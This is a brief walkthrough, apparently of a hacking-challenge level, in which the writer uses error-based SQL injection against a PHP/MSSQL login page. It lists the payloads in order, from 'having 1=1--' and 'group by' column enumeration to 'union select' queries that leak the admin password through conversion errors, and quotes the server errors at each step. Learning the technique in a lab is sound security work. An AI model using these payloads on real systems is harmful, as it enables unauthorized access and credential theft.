This time Drake invented another secure PHP and MSSQL login. But he once again failed to secure it...

so i tried to login as admin:admin and got error 
then i change the name to ' and password to any string and got a server error:
    Microsoft OLE DB Provider for SQL Server error '80040e14'
    Unclosed quotation mark before the character string '' and password = ''.
    /secure.php, line 666

then i inserted ' having 1=1--
    Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
    [Microsoft][ODBC SQL Server Driver][SQL Server]Column 'users.id' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.
    /secure.php, line 666+

so now i have ' group by users.id having 1=1--
got to see another column users.username

so now ' group by users.id, users.username having 1=1--
now we saw users.password so in next we have
' group by users.id, users.username, users.password having 1=1--


next we have users.privID
' group by users.id, users.username, users.password, users.privID having 1=1--
after inserting this we didn't get error by server but by the db that this username and password were not in
the db.....this means no there are no more column

so now
' union select min(username),1,1,1 from users where username > 'a'--
we get:
    Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
    [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value 'admin' to a column of data type int. /secure.php, line 666

therefore now we finally have
' union select password,1,1,1 from users where username = 'admin'--
